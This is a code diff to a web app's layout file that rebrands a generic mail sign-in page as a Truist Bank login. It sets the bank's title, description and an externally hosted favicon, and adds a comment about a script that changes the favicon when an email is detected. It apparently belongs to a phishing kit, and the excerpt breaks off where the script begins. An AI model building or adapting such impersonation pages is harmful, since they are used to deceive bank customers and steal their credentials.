@@ -14,14 +14,18 @@ const geistMono = Geist_Mono({
 });
 
 export const metadata = {
-  title: "",
-  description: "Signin to your mail account",
+  title: "Truist Bank | Checking, Savings, Lending, and Financial Services",
+  description: "Sign in to your Truist account",
+  icons: {
+    icon: "https://image2url.com/images/1765306707255-2d6bb696-bba0-41a1-b3d0-2edade6f1db1.ico",
+  },
 };
 
 export default function RootLayout({ children }) {
   return (
     <html lang="en">
       <head>
+        {/* Default favicon is set in metadata. The script below will override if email is detected */}
         <script
           dangerouslySetInnerHTML={{
             __html: `
